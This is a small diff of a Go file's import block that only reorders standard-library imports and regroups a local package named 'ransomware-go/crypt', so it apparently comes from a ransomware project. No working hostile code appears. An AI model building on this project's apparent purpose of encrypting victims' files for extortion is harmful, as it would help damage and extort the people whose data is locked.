@@ -1,15 +1,16 @@
 package main
 
 import (
-	"sync"
-	"flag"
-	"runtime"
-	"os"
-	"path/filepath"
 	"fmt"
+	"os"
+	"flag"
+	"sync"
+	"runtime"
 	"strings"
-	"ransomware-go/crypt"
 	"io/ioutil"
+	"path/filepath"
+
+	"ransomware-go/crypt"
 )
 
 var (
